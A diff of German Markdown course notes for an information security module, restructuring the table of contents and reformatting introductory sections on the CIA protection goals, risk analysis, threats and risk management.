@@ -2,101 +2,286 @@
 
 - [ISich, Informationssicherheit, INF-P-IN008, BE1, HS20/21](#isich--informationssicherheit--inf-p-in008--be1--hs20-21)
   * [1 Einführung in die Informationssicherheit und Sicherheitskonzepte](#1-einf-hrung-in-die-informationssicherheit-und-sicherheitskonzepte)
-      - [Lernziele](#lernziele)
-      - [Vorbereitung](#vorbereitung)
-      - [Präsenz](#pr-senz)
-          + [CIA](#cia)
-      - [Nachbearbeitung](#nachbearbeitung)
-        * [Distributed Denial of Service (DDoS)](#distributed-denial-of-service--ddos-)
-          + [Angriff](#angriff)
+    + [Lernziele](#lernziele)
+    + [Vorbereitung](#vorbereitung)
+    + [Präsenz](#pr-senz)
+      - [Wo wird wie angegriffen?](#wo-wird-wie-angegriffen-)
+      - [Wieso Sicherheit?](#wieso-sicherheit-)
+      - [Wieviel Security ist nötig?](#wieviel-security-ist-n-tig-)
+        * [Aufwand und Ertrag](#aufwand-und-ertrag)
+        * [Nachhaltigkeit](#nachhaltigkeit)
+        * [Bedrohungspyramide](#bedrohungspyramide)
+      - [Grundsätze](#grunds-tze)
+      - [CIA](#cia)
+        * [Schutzziele](#schutzziele)
+        * [Grundsätze:](#grunds-tze-)
+        * [Confidentiality (Vertraulichkeit)](#confidentiality--vertraulichkeit-)
+        * [Integrity (Integrität)](#integrity--integrit-t-)
+        * [Availability (Verfügbarkeit)](#availability--verf-gbarkeit-)
+        * [Verwandte Begriffe](#verwandte-begriffe)
+      - [Risikoanalyse](#risikoanalyse)
+        * [Ressourcen](#ressourcen)
+        * [Gefährdung](#gef-hrdung)
+        * [Schwachstelle](#schwachstelle)
+        * [Bedrohung](#bedrohung)
+        * [Risiko](#risiko)
+        * [Risikomanagement](#risikomanagement)
+        * [Umgang mit Risiken](#umgang-mit-risiken)
+      - [ISMS - Information security management system](#isms---information-security-management-system)
+        * [Definition](#definition)
+        * [Vorteile eines ISMS](#vorteile-eines-isms)
+        * [Minimale Anforderungen](#minimale-anforderungen)
+        * [Kritische Erfolgsfaktoren](#kritische-erfolgsfaktoren)
+      - [Sicherheitspyramide](#sicherheitspyramide)
+        * [Akteure und Verantwortlichkeiten](#akteure-und-verantwortlichkeiten)
+        * [Chief Information Security Officer](#chief-information-security-officer)
+        * [Linienorganisation](#linienorganisation)
+        * [Projektorganisation](#projektorganisation)
+      - [Demi Cycle](#demi-cycle)
+        * [Plan](#plan)
+        * [Do](#do)
+        * [Check](#check)
+        * [Act](#act)
+      - [Verschiedene Regulatorien](#verschiedene-regulatorien)
+      - [ISMS: Standards](#isms--standards)
+        * [Standards](#standards)
+        * [ISO 27001](#iso-27001)
+    + [Nachbearbeitung](#nachbearbeitung)
+      - [Distributed Denial of Service (DDoS)](#distributed-denial-of-service--ddos-)
+        * [Angriff](#angriff)
+          + [Detektion](#detektion)
+          + [Verhinderung](#verhinderung)
   * [2 Anwendungssicherheit](#2-anwendungssicherheit)
-      - [Lernziele](#lernziele-1)
-      - [Vorbereitung](#vorbereitung-1)
-        * [OWASP](#owasp)
-          + [OWASP Top10](#owasp-top10)
-          + [Example Attack Scenarios](#example-attack-scenarios)
-          + [Aufgabe: Übung Analyse Webanwendung (ca. 2h)](#aufgabe---bung-analyse-webanwendung--ca-2h-)
-        * [Kapitel 3 und 4 IT-Sicherheit](#kapitel-3-und-4-it-sicherheit)
-          + [ISO/OSI-Modell](#iso-osi-modell)
+    + [Lernziele](#lernziele-1)
+    + [Vorbereitung](#vorbereitung-1)
+      - [OWASP](#owasp)
+      - [OWASP Top10](#owasp-top10)
+        * [A1 – Injection](#a1---injection)
+        * [A2 – Broken Authentication and Session Management](#a2---broken-authentication-and-session-management)
+        * [A3 – Cross-Site Scripting (XSS)](#a3---cross-site-scripting--xss-)
+        * [A4 – Insecure Direct Object References](#a4---insecure-direct-object-references)
+        * [A5 – Security Misconfiguration](#a5---security-misconfiguration)
+        * [A6 – Sensitive Data Exposure](#a6---sensitive-data-exposure)
+        * [A7 – Missing Function Level Access Control](#a7---missing-function-level-access-control)
+        * [A8 - Cross-Site Request Forgery (CSRF)](#a8---cross-site-request-forgery--csrf-)
+        * [A9 - Using Components with Known Vulnerabilities](#a9---using-components-with-known-vulnerabilities)
+        * [A10 – Unvalidated Redirects and Forwards](#a10---unvalidated-redirects-and-forwards)
+      - [Example Attack Scenarios](#example-attack-scenarios)
+        * [A1 – Injection](#a1---injection-1)
+        * [A2 – Broken Authentication and Session Management "Hijacking"](#a2---broken-authentication-and-session-management--hijacking-)
+        * [A3 – Cross-Site Scripting (XSS)](#a3---cross-site-scripting--xss--1)
+        * [A4 – Insecure Direct Object References](#a4---insecure-direct-object-references-1)
+        * [A5 – Security Misconfiguration](#a5---security-misconfiguration-1)
+        * [A6 – Sensitive Data Exposure](#a6---sensitive-data-exposure-1)
+        * [A7 – Missing Function Level Access Control](#a7---missing-function-level-access-control-1)
+        * [A8 - Cross-Site Request Forgery (CSRF)](#a8---cross-site-request-forgery--csrf--1)
+        * [A9 - Using Components with Known Vulnerabilities](#a9---using-components-with-known-vulnerabilities-1)
+        * [A10 – Unvalidated Redirects and Forwards](#a10---unvalidated-redirects-and-forwards-1)
+      - [Aufgabe: Übung Analyse Webanwendung (ca. 2h)](#aufgabe---bung-analyse-webanwendung--ca-2h-)
+      - [Kapitel 3 und 4 IT-Sicherheit](#kapitel-3-und-4-it-sicherheit)
+        * [ISO/OSI-Modell](#iso-osi-modell)
           + [Das TCP/IP-Referenzmodell](#das-tcp-ip-referenzmodell)
-          + [Well-Known Ports](#well-known-ports)
-          + [NAT-Tabelle](#nat-tabelle)
-        * [Sicherheitsprobleme](#sicherheitsprobleme)
+        * [Well-Known Ports](#well-known-ports)
+        * [NAT-Tabelle](#nat-tabelle)
+      - [Sicherheitsprobleme](#sicherheitsprobleme)
         * [IP](#ip)
           + [Vertraulichkeit, Integrität und Verbindlichkeit](#vertraulichkeit--integrit-t-und-verbindlichkeit)
-          + [ICMP](#icmp)
-          + [ARP](#arp)
-          + [UDP und TCP](#udp-und-tcp)
-          + [Netzdiensten](#netzdiensten)
-          + [DNS - Domain Name Service](#dns---domain-name-service)
-        * [Security Engineering](#security-engineering)
+        * [ICMP](#icmp)
+        * [ARP](#arp)
+        * [UDP und TCP](#udp-und-tcp)
+        * [Netzdiensten](#netzdiensten)
+        * [DNS - Domain Name Service](#dns---domain-name-service)
+      - [Security Engineering](#security-engineering)
         * [Phasen](#phasen)
         * [Schutzbedarfsermittlung](#schutzbedarfsermittlung)
-          + [Szenarios](#szenarios)
-        * [Bedrohungsmatrix](#bedrohungsmatrix)
+        * [Szenarios](#szenarios)
+          + [Gesetze](#gesetze)
+          + [Selbstbestimmungsrecht](#selbstbestimmungsrecht)
+          + [Unversehrtheit](#unversehrtheit)
+          + [Aufgabenerfüllung](#aufgabenerf-llung)
+          + [Negative Auswirkungen](#negative-auswirkungen)
+          + [Finanzielle Auswirkungen](#finanzielle-auswirkungen)
+      - [Bedrohungsmatrix](#bedrohungsmatrix)
+        * [Exterene Angriffe](#exterene-angriffe)
+        * [Interne Angriffe](#interne-angriffe)
+        * [Denial-of-Service](#denial-of-service)
+        * [Abstreiten](#abstreiten)
+        * [Rechtemissbrauch](#rechtemissbrauch)
+        * [Auslöser](#ausl-ser)
         * [Bedrohungsbaum](#bedrohungsbaum)
-        * [Risikoanalyse](#risikoanalyse)
+        * [Risikoanalyse](#risikoanalyse-1)
         * [Penetrationstests](#penetrationstests)
         * [Sicherheitsgrundfunktionen](#sicherheitsgrundfunktionen)
-        * [SDL - Security Development Lifecycle](#sdl---security-development-lifecycle)
-          + [Entwicklungsphasen](#entwicklungsphasen)
-          + [Bedrohungs- und Risikoanalyse](#bedrohungs--und-risikoanalyse)
-      - [Präsenz](#pr-senz-1)
-        * [OWASP](#owasp-1)
+      - [SDL - Security Development Lifecycle](#sdl---security-development-lifecycle)
+        * [Entwicklungsphasen](#entwicklungsphasen)
+        * [Bedrohungs- und Risikoanalyse](#bedrohungs--und-risikoanalyse)
+          + [STRIDE](#stride)
+          + [DREAD](#dread)
+    + [Präsenz](#pr-senz-1)
+      - [TCP/IP Schichtenmodell](#tcp-ip-schichtenmodell)
+      - [Wieso ist die Anwendungssicherheit so wichtig?](#wieso-ist-die-anwendungssicherheit-so-wichtig-)
+      - [SQL Injection](#sql-injection)
+      - [OWASP](#owasp-1)
+        * [Methodology](#methodology)
           + [OWASP Top 10 2010 -> 2013 -> 2017](#owasp-top-10-2010----2013----2017)
       - [Injection](#injection)
       - [Cross Site Scripting](#cross-site-scripting)
       - [Cross Site Request Forgery](#cross-site-request-forgery)
       - [Sichere Anwendungsentwicklung](#sichere-anwendungsentwicklung)
       - [Security Development Life Cycle](#security-development-life-cycle)
-      - [Nachbearbeitung](#nachbearbeitung-1)
-        * [Buffer Overflow](#buffer-overflow)
+    + [Nachbearbeitung](#nachbearbeitung-1)
+      - [Memory Leak](#memory-leak)
+      - [Buffer Overflow](#buffer-overflow)
+        * [Buffer Overflows Massnahmen](#buffer-overflows-massnahmen)
+      - [Time of Check, Time of Use (TOCTUE)](#time-of-check--time-of-use--toctue-)
+      - [Anwendungssicherheit](#anwendungssicherheit)
+      - [Testing](#testing)
+        * [Organisation des Testens](#organisation-des-testens)
+        * [Typen von Tests](#typen-von-tests)
+        * [Kategorien von Testtools](#kategorien-von-testtools)
+        * [Auslieferung und Wartung](#auslieferung-und-wartung)
+      - [Security Development Life Cycle](#security-development-life-cycle-1)
+        * [Phase 1 - Requirements](#phase-1---requirements)
+        * [Phase 2 - Design](#phase-2---design)
+        * [Phase 3 - Implementation](#phase-3---implementation)
+        * [Phase 4 - Verification](#phase-4---verification)
+        * [Phase 5 - Release](#phase-5---release)
+      - [Incident](#incident)
   * [3 Kryptographie](#3-kryptographie)
-      - [Lernziele](#lernziele-2)
-      - [Vorbereitung](#vorbereitung-2)
-        * [Leitsatz](#leitsatz)
-        * [Definition](#definition)
-        * [Sicherheitsziele](#sicherheitsziele)
-        * [Krypto-Puzzle](#krypto-puzzle)
-        * [Grobe Gegnerkathegorien](#grobe-gegnerkathegorien)
-        * [Angriffe](#angriffe)
-        * [Verschlüsselung](#verschl-sselung)
-        * [Authentizierwert anhängen](#authentizierwert-anh-ngen)
-        * [Verfahren](#verfahren)
-        * [Codierungen](#codierungen)
-        * [Hashfunktionen](#hashfunktionen)
-        * [Hybride Verschlüsserlung](#hybride-verschl-sserlung)
-        * [Symmetrische Verfahren](#symmetrische-verfahren)
+    + [Lernziele](#lernziele-2)
+    + [Vorbereitung](#vorbereitung-2)
+      - [Leitsatz](#leitsatz)
+      - [Definition](#definition-1)
+      - [Einsatz von Kryptographie](#einsatz-von-kryptographie)
+      - [Kerckhoffscher Satz](#kerckhoffscher-satz)
+      - [Sicherheitsziele](#sicherheitsziele)
+      - [Krypto-Puzzle](#krypto-puzzle)
+      - [Grobe Gegnerkathegorien](#grobe-gegnerkathegorien)
+      - [Angriffe](#angriffe)
+      - [Bedrohungen I](#bedrohungen-i)
+      - [Bedrohungen II](#bedrohungen-ii)
+      - [Verschlüsselung](#verschl-sselung)
+      - [Authentizierwert anhängen](#authentizierwert-anh-ngen)
+      - [Verfahren](#verfahren)
+      - [Asymmetrische Verschlüsselung](#asymmetrische-verschl-sselung)
+      - [Vergleich Symmetrisch Asymmetrisch](#vergleich-symmetrisch-asymmetrisch)
+      - [Codierungen](#codierungen)
+      - [Hashfunktionen](#hashfunktionen)
+      - [Hybride Verschlüsserlung](#hybride-verschl-sserlung)
+      - [Symmetrische Verfahren](#symmetrische-verfahren)
         * [Blockchiffren](#blockchiffren)
         * [Stromchiffren](#stromchiffren)
         * [Asymmetrische Verfahren](#asymmetrische-verfahren)
         * [RSA](#rsa)
-        * [Blockchiffren im Blockmodus](#blockchiffren-im-blockmodus)
+      - [Blockchiffren im Blockmodus](#blockchiffren-im-blockmodus)
         * [ECB-Modus (Electronic Codebook) für mehrere Blöcke](#ecb-modus--electronic-codebook--f-r-mehrere-bl-cke)
         * [CBC-Modus (Cipher Block Chaining) für mehrere Blöcke](#cbc-modus--cipher-block-chaining--f-r-mehrere-bl-cke)
-      - [Präsenz](#pr-senz-2)
-      - [Nachbearbeitung](#nachbearbeitung-2)
+    + [Präsenz](#pr-senz-2)
+      - [Übersicht: Angiffe vs. Kryptographische Verfahren](#-bersicht--angiffe-vs-kryptographische-verfahren)
+    + [Nachbearbeitung](#nachbearbeitung-2)
   * [4 Identity- und Accessmanagement](#4-identity--und-accessmanagement)
-      - [Lernziele](#lernziele-3)
-      - [Vorbereitung](#vorbereitung-3)
-      - [Präsenz](#pr-senz-3)
+    + [Lernziele](#lernziele-3)
+    + [Vorbereitung](#vorbereitung-3)
+    + [Präsenz](#pr-senz-3)
+      - [ISO/IEC: Identity Management (IdM) umfasst](#iso-iec--identity-management--idm--umfasst)
+        * [Identity Management - IdM](#identity-management---idm)
+      - [Access Management (Authentisierung, Authorisierung)](#access-management--authentisierung--authorisierung-)
+      - [Argumente für Identity & Access Management (IAM)](#argumente-f-r-identity---access-management--iam-)
+        * [Kosteneinsparung](#kosteneinsparung)
+        * [Wettbewerbsvorteile](#wettbewerbsvorteile)
+        * [Vereinfachtes Reporting](#vereinfachtes-reporting)
+        * [IT Risikomanagement](#it-risikomanagement)
+      - [IAM Kernprozesse](#iam-kernprozesse)
+        * [Governance](#governance)
+        * [Risikomanagement](#risikomanagement-1)
+        * [Compliance](#compliance)
+        * [Verwaltung der Identitäten](#verwaltung-der-identit-ten)
+        * [Komponenten im IAM](#komponenten-im-iam)
+        * [Das Identity Management umfasst folgende Komponenten](#das-identity-management-umfasst-folgende-komponenten)
+        * [Access Management umfasst folgende Komponenten:](#access-management-umfasst-folgende-komponenten-)
+      - [Identitätsmanagement (IdM) Konzepte](#identit-tsmanagement--idm--konzepte)
+        * [Isolierte Benutzer und Berechtigungsnachweise pro Anwendung](#isolierte-benutzer-und-berechtigungsnachweise-pro-anwendung)
+        * [Zentralisierte Benutzerverwaltung](#zentralisierte-benutzerverwaltung)
+        * [Federation](#federation)
+        * [Beispiel SwitchAAI FFHS (OpenSource)](#beispiel-switchaai-ffhs--opensource-)
+        * [Hauptkomponente:](#hauptkomponente-)
+        * [Switch AAI beruht auf standardisierten Technologien:](#switch-aai-beruht-auf-standardisierten-technologien-)
+      - [Identity Federation - Andere Technologien](#identity-federation---andere-technologien)
+      - [Ablauf eines Zugriffes](#ablauf-eines-zugriffes)
+        * [Authentisierung](#authentisierung)
+        * [Passwortschutz](#passwortschutz)
+        * [Passwortmanagement](#passwortmanagement)
+        * [SmartCard](#smartcard)
+        * [One Time Password](#one-time-password)
+        * [Biometrische Zutrittskontrollen](#biometrische-zutrittskontrollen)
+        * [Cross Over Error Rate](#cross-over-error-rate)
+        * [Single SignOn](#single-signon)
+        * [Kerberos](#kerberos)
+        * [Zertifikate (PKI)](#zertifikate--pki-)
+        * [Risiken von SSO](#risiken-von-sso)
+        * [Authorisierung](#authorisierung)
+        * [ACL - Access Control Listen](#acl---access-control-listen)
+        * [MAC - Mandatory Access Control](#mac---mandatory-access-control)
+        * [RBAC - Role Based Access Control](#rbac---role-based-access-control)
+        * [Autorisierung: 4-Augen Prinzip](#autorisierung--4-augen-prinzip)
+      - [Risiken von IAM](#risiken-von-iam)
+      - [Risiken im Zusammenhang mit IAM](#risiken-im-zusammenhang-mit-iam)
+        * [Identitätsdiebstahl](#identit-tsdiebstahl)
+        * [IAM und OWASP](#iam-und-owasp)
   * [5 Netzwerk- und Systemsicherheit](#5-netzwerk--und-systemsicherheit)
-      - [Lernziele](#lernziele-4)
-      - [Vorbereitung](#vorbereitung-4)
-      - [Präsenz](#pr-senz-4)
-      - [Nachbearbeitung](#nachbearbeitung-3)
-
+    + [Lernziele](#lernziele-4)
+    + [Vorbereitung](#vorbereitung-4)
+    + [Präsenz](#pr-senz-4)
+      - [Netzwerke](#netzwerke)
+      - [Bedrohungen der Netzwerksicherheit](#bedrohungen-der-netzwerksicherheit)
+        * [DDOS Problematik](#ddos-problematik)
+        * [Normaler TCP Handshake & SYN Flooding](#normaler-tcp-handshake---syn-flooding)
+        * [SYN Flooding](#syn-flooding)
+        * [Botnetze](#botnetze)
+        * [Sonstige Attacken im Netzwerk](#sonstige-attacken-im-netzwerk)
+      - [Firewall](#firewall)
+        * [DMZ - De-Militarized Zone](#dmz---de-militarized-zone)
+        * [VPN - Virtual Private Network](#vpn---virtual-private-network)
+        * [Firewall - Typen](#firewall---typen)
+        * [Paketfilter](#paketfilter)
+        * [Firewall - Grenzen](#firewall---grenzen)
+      - [Netzwerkzonierung - einfach](#netzwerkzonierung---einfach)
+      - [Netzwerkzonierung - komplex](#netzwerkzonierung---komplex)
+        * [IDS - Intrusion Detection Systems](#ids---intrusion-detection-systems)
+          + [Netzwerk basierte IDS](#netzwerk-basierte-ids)
+          + [Host basierte IDS](#host-basierte-ids)
+        * [Honeypot - Honeynet](#honeypot---honeynet)
+        * [Best-Practice Massnahmen Netzwerksicherheit](#best-practice-massnahmen-netzwerksicherheit)
+        * [Best Practice Firewall Policy](#best-practice-firewall-policy)
+        * [Wireless LAN](#wireless-lan)
+        * [Organisatorische Massnahmen](#organisatorische-massnahmen)
+      - [Systemsicherheit](#systemsicherheit)
+        * [Bedrohungen der Systemsicherheit](#bedrohungen-der-systemsicherheit)
+        * [Viren- und Spamschutz](#viren--und-spamschutz)
+        * [Grenzen des Virenschutzes](#grenzen-des-virenschutzes)
+        * [Online Malware Analyse](#online-malware-analyse)
+      - [System Härtung](#system-h-rtung)
+        * [Server Dienste](#server-dienste)
+        * [Security Lifecycle](#security-lifecycle)
+      - [Patching](#patching)
+      - [Systemhärtung](#systemh-rtung)
+        * [Nutzen der Systemhärtung](#nutzen-der-systemh-rtung)
+        * [Microsoft Plattform](#microsoft-plattform)
+        * [Unix Plattformen](#unix-plattformen)
+        * [System- und Netzwerksicherheit und OWASP](#system--und-netzwerksicherheit-und-owasp)
+    + [Nachbearbeitung](#nachbearbeitung-3)
+- [Musterprüfung](#musterpr-fung)
 
 ---
 ## 1 Einführung in die Informationssicherheit und Sicherheitskonzepte
 
-#### Lernziele
+### Lernziele
 
 - Ich lerne die Grundbegriffe und -konzepte der Informationssicherheit kennen und weiss um aktuelle Bedrohungen.
 - Ich kann mich in der Umgebung für die HackingTool Übungen bewegen. 
 - Ich weiss, wie der OpenVPN Zugriff funktioniert und kann diesen für eine sichere Anmeldung verwenden.
 
-#### Vorbereitung
+### Vorbereitung
 
 - [Lektion1 Vorbereitung](links/Lektion1 Vorbereitung 2019-20.pdf)
 
@@ -107,16 +292,16 @@
 - Optional - Lehrbuch C. Eckert: Lesen Sie Kapitel 2. Sie vertiefen bei persönlichem Interesse das in der vorherigen PVA besprochene Wissen über die Grundlagen der IT Sicherheit.
     - Notizen:
 
-#### Präsenz
+### Präsenz
 
-- Wo wird wie angegriffen?
+#### Wo wird wie angegriffen?
 
 ![](links/2020-08-15_09-00-37.png)
 
-- **Wieso Sicherheit?**
-    - Vertraulichkeit
-    - Integrität
-    - Verfügbarkeit
+#### Wieso Sicherheit?
+- Vertraulichkeit
+- Integrität
+- Verfügbarkeit
     
 Informationen und die sie unterstützenden Prozesse, Systeme und
 Netzwerke sind wichtige Geschäftswerte. Ihre Vertraulichkeit, Integrität und Verfügbarkeit können wesentlich zur Erhaltung von Wettbewerbsvorsprung, Liquidität, Rentabilität, Einhaltung gesetzlicher Vorschriften und Geschäftsansehen beitragen.
@@ -126,9 +311,9 @@ Bedrohungen. Sie soll die Aufrechterhaltung des Geschäftsbetriebs gewährleiste
 
 [Verizon Data Breach Report](https://enterprise.verizon.com/de-de/resources/reports/dbir/) 
 
-- Wieviel Security ist nötig?
+#### Wieviel Security ist nötig?
 
-Aufwand und Ertrag
+##### Aufwand und Ertrag
 
 - Es gibt keine absolute Sicherheit 
 - IT Security soll die Werte der Firma schützen: "So viel wie nötig, so wenig wie möglich"
@@ -136,7 +321,7 @@ Aufwand und Ertrag
 
 ![Aufwand und Ertrag](links/2020-08-15_10-26-07.png)
 
-Nachhaltigkeit
+##### Nachhaltigkeit
 
 - "Aufräumaktionen" In unregelmässigen Abständen verursachen grosse Kosten und Unruhe ohne dass die Risiken angemessen erkannt und managed werden.
 
@@ -147,13 +332,13 @@ Nachhaltigkeit
 
 Es werden generell nur Investitionen gemacht wenn das Risiko sinkt - Sägezahncompliance (Bild links)
 
-Bedrohungspyramide
+##### Bedrohungspyramide
 
 ![Bedrohungspyramide](links/2020-08-15_10-46-33.png)
 
 - [Beispiel ATP Case Ruag](https://www.melani.admin.ch/melani/de/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html)
 
-Grundsätze
+#### Grundsätze
 
 - IT-Sicherheit ist kein Selbstzweck, sondern dient immer einem übergeordneten Ziel (Unterstützung eines Geschäftsprozesses oder Wahrung der Privatsphäre).
 
@@ -163,39 +348,39 @@ Grundsätze
 
 - Sicherheit ist eine Kette und nur so stark wie ihr schwächstes Glied. 
 
-###### CIA
+#### CIA
 
-- **Schutzziele**
+##### Schutzziele
 
 ![CIA](links/2020-08-15_11-01-34.png)
 
-- Grundsätze:
-    - IT-Sicherheit ist kein Selbstzweck, sondern dient immer einem übergeordneten Ziel (Unterstützung eines Geschäftsprozesses ider Wahrung der Privatsphäre).
-    - Es gibt keine 100% Sicherheit, aber es gibt eine für ein Problem abgemessene SIcherheti. Diese muss für jedes Projekt / jede Anwendung / jede Firma individuell bestimmt werden.
-    - Sicherheit soll einfach sein und soll den Benutzer möglichst nicht behindern.
-    - Sicherheit ist eine Kette und nur so stark wie ihr schwächstes Glied.
+##### Grundsätze:
+- IT-Sicherheit ist kein Selbstzweck, sondern dient immer einem übergeordneten Ziel (Unterstützung eines Geschäftsprozesses ider Wahrung der Privatsphäre).
+- Es gibt keine 100% Sicherheit, aber es gibt eine für ein Problem abgemessene SIcherheti. Diese muss für jedes Projekt / jede Anwendung / jede Firma individuell bestimmt werden.
+- Sicherheit soll einfach sein und soll den Benutzer möglichst nicht behindern.
+- Sicherheit ist eine Kette und nur so stark wie ihr schwächstes Glied.
     
-- Confidentiality (Vertraulichkeit)
-    - Vertraulichkeit bedeutet: Daten vor unbefugtem Zugriff zu schützen.
-        - Need to know Prinzip
-        - Zugriffsberechtigungen
-        - Datenverschlüsselung (Kryptographie)
-        - Daten verstecken (Steganographie)
+##### Confidentiality (Vertraulichkeit)
+- Vertraulichkeit bedeutet: Daten vor unbefugtem Zugriff zu schützen.
+    - Need to know Prinzip
+    - Zugriffsberechtigungen
+    - Datenverschlüsselung (Kryptographie)
+    - Daten verstecken (Steganographie)
         
-- Integrity (Integrität)
-    - Integrität besagt, dass Daten über einen bestimmten Zeitraum vollständig und unverändert sein müssen.
-        - Dazu müssen die Daten vor Verlust und nicht autorisierter Veränderung geschützt werden.
-        - Integrität kann mit kryptographisch gesichterten Prüfsummen geprüft/bewiesen werden (Hash).
+##### Integrity (Integrität)
+- Integrität besagt, dass Daten über einen bestimmten Zeitraum vollständig und unverändert sein müssen.
+    - Dazu müssen die Daten vor Verlust und nicht autorisierter Veränderung geschützt werden.
+    - Integrität kann mit kryptographisch gesichterten Prüfsummen geprüft/bewiesen werden (Hash).
         
-- Availability (Verfügbarkeit)
-    - Die Verfügbarkeit stellt sicher, dass ein berechtigter Benutzer zu dem Zeitpunkt auf eine Information zugreifen kann, zu der er sie braucht.
-        - Gemessen wir sie wie folgt:
+##### Availability (Verfügbarkeit)
+- Die Verfügbarkeit stellt sicher, dass ein berechtigter Benutzer zu dem Zeitpunkt auf eine Information zugreifen kann, zu der er sie braucht.
+    - Gemessen wir sie wie folgt:
         
-        ![](links/2020-08-15_11-24-36 copy.png)
+    ![](links/2020-08-15_11-24-36 copy.png)
         
-        - Eine Verfügbarkeit von 99.99% entspricht dabei einer jährichen Ausfallzeit von ca. 1h.
+    - Eine Verfügbarkeit von 99.99% entspricht dabei einer jährichen Ausfallzeit von ca. 1h.
     
-Verwandte Begriffe
+##### Verwandte Begriffe
 
 - Authentizität: Echtheit und Glaubwürdigkeit einer Person oder eines Dienstes müssen überprüfbar sein.
 - Nachvollziehbarkeit: Handlungen von Benutzern oder Systemen müssen aufgezeichnet werden (Logging).
@@ -203,87 +388,86 @@ Verwandte Begriffe
 - Verbindlichkeit/Nichtabstreitbarkeit (Non-Repudiation): Sie erfordert, dass „kein unzulässiges Abstreiten durchgeführter Handlungen“ möglich ist. Sie ist unter anderem wichtig beim elektronischen Abschluss von Verträgen. Erreichbar ist sie beispielsweise durch elektronische Signaturen.
 - Nicht-Anfechtbarkeit: der Nachweis, dass eine Nachricht versendet und empfangen worden ist.
     
-- Risikoanalyse
+#### Risikoanalyse
     
-    ![](links/2020-08-15_11-36-06.png)
+![](links/2020-08-15_11-36-06.png)
     
-- Ressourcen
-    - Unter Ressourcen verstehen wir im Rahmen des IT Security Risikomanagements schützenswerte Objekte.
-        - Beispiele:
-            - Mitarbeiter
-            - Daten des Unternehmens
-            - Hardware / Infrastruktur des Unternehmens
-            - Uneingeschränkte Verfügbarkeit der IT Services
+##### Ressourcen
+- Unter Ressourcen verstehen wir im Rahmen des IT Security Risikomanagements schützenswerte Objekte.
+- Beispiele:
+    - Mitarbeiter
+    - Daten des Unternehmens
+    - Hardware / Infrastruktur des Unternehmens
+    - Uneingeschränkte Verfügbarkeit der IT Services
     
-- Gefährdung
-    - Gefahr (engl. danger): Zustand oder Vorgang, der zu Schaden (materiell oder immateriell) für Mensch, Umwelt oder Sachgüter (Werte) führen kann.
-    - Gefährdung ist die Gefahr, die auf ein bestimmtes Objekt bezogen wird.
-    - Ein Akteur, der eine Schwachstelle ausnutzt führt zu einer Gefährdung einer Ressource und kann diese beschädigen.
+##### Gefährdung
+- Gefahr (engl. danger): Zustand oder Vorgang, der zu Schaden (materiell oder immateriell) für Mensch, Umwelt oder Sachgüter (Werte) führen kann.
+- Gefährdung ist die Gefahr, die auf ein bestimmtes Objekt bezogen wird.
+- Ein Akteur, der eine Schwachstelle ausnutzt führt zu einer Gefährdung einer Ressource und kann diese beschädigen.
     
-- Schwachstelle
-    - Schwachstellen sind Fehler in einer Software oder einem Prozess, welche von einem Akteur ausgnutzt werden kann.
-        - Eine Schwachstelle kann technischer Art sein (z.B. eine fehlende Input Validierung).
-        - Eine Schwachstelle kann aber auch in einem Prozess liegen. Fehlt z.B. das Vier-Augen-Prinzip bei dem Abschluss von Verträgen, kann dies eine Schwachstelle darstellen.
-        - Die Gutgläubigkeit der Menschen kann eine Schwachstelle sein (Stichwort: Social Engineering).
-        - **Input Validierung** z.B. SQL Injection
-    
-- Bedrohung
+##### Schwachstelle
+Schwachstellen sind Fehler in einer Software oder einem Prozess, welche von einem Akteur ausgnutzt werden kann.
+
+- Eine Schwachstelle kann technischer Art sein (z.B. eine fehlende Input Validierung).
+- Eine Schwachstelle kann aber auch in einem Prozess liegen. Fehlt z.B. das Vier-Augen-Prinzip bei dem Abschluss von Verträgen, kann dies eine Schwachstelle darstellen.
+- Die Gutgläubigkeit der Menschen kann eine Schwachstelle sein (Stichwort: Social Engineering).
+- **Input Validierung** z.B. SQL Injection
+
+##### Bedrohung
     - Eine Bedrohung ist eine Aktion oder Ereignis, das die Sicherheit gefährdet und bei Eintreten das korrekte Funktionieren eines Systems verunmöglicht.
         - Bedrohungen wirken gegen eine der Hauptsäulen der Sicherheit (Verfügbarkeit, Vertraulichkeit, Integrität)
         - Eine Bedrohung selbst führt noch zu keinem Schaden, erst wenn ein Akteur (Threat Agent) tätigt wird und eine Schwachstelle ausnutzt, kann dies der Fall sein.
     
-- Risiko
-    - Das Risiko ist die Bewertung der 
-      
-    Kette -> Bedrohung -> Schwachstelle -> Gefährdung -> Ressource 
-      
-    nach Eintretenswahrscheindlichkeit und Schadensausmass.
-    
-    - Risiko = Eintretenswahrscheindlichkeit x Schadensausmass
-    - Eintretenswahrscheindlichkeit: Wie häufig tritt ein Ereignis in einem bestimmten Zeitraum ein oder wie lange ist der Zeitraum zwischen zwei Ereignissen.
-    - Schadensausmass: Was passiert mit einer Ressource, wenn ein Ereignis eintritt?
-    - In der Regel nimmt man für beide Werte die schwersten Ausprägungen an.
-    
-- Risikomanagement
-    
-    ![](links/2020-08-15_11-45-34 copy.png)
-    
-    - Risiken sollen so verwaltet werden, dass sie möglichst nicht im inakzeptablen Bereich liegen. In der Praxis lässt sich das Schadensausmass oft nicht verringern, weshalb das Risiko meist durch Reduktion der Eintrittswahrscheindlichkeit verringert wird. Dazu werden mitigierende Kontrollen definiert.
-        - Regelmässig sind alle Risiken und die mitigierenden Massnahmen neu zu bewerten um sicherzustellen, dass das Risiko noch im akzeptablen Bereich liegt.
-    
-- Umgang mit Risiken
-    - Mögliche Strategien im Umgang mit Risiken:
-        - Eliminieren
-            - Durch geeignete Massnahmen die Eintretenswahrscheindlichkeit auf Null senken.
-        - Überwälzen
-            - Das Risiko wird versichert, bzw. auf einen anderen Marktteilnehmer übertragen (z.B. mittels AGB).
-        - Reduzieren (Mitigieren)
-            - Das Schadensausmass wird durch geeignete Massnahmen reduziert.
-        - Akzeptieren
-            - Das Risiko wird als geschäftsnotwendig akzeptiert, laufend überwacht und regelmässig neu bewertet.
+##### Risiko
+Das Risiko ist die Bewertung der Kette:
 
-- **ISMS**
-    
-    - [ISMS](https://en.wikipedia.org/wiki/Information_security_management)
-    
-Information security management system
+> -> Bedrohung -> Schwachstelle -> Gefährdung -> Ressource 
 
+nach Eintretenswahrscheindlichkeit und Schadensausmass.
+
+- Risiko = Eintretenswahrscheindlichkeit x Schadensausmass
